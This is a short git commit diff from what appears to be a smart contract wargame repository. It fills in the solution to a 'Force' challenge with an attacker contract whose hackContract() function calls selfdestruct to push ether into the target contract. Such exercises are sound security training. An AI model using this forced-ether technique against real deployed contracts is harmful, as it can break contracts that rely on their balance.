bce1b8404e5e9c62a63794b10aaa54d04e8c75d8
sraylr <ogjkerr@gmail.com>
2022-07-02 08:45:36 -0700

    challenge 3

--- contracts/3. Force/AttackingForce.sol
+++ contracts/3. Force/AttackingForce.sol
@@ -3,13 +3,13 @@ pragma solidity ^0.8.9;
 import "./Force.sol";
 
 contract AttackingForce {
-    address public contractAddress;
+    address payable public contractAddress;
 
     constructor(address _contractAddress) payable {
-        contractAddress = _contractAddress;
+        contractAddress = payable(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        selfdestruct(contractAddress);
     }
 }
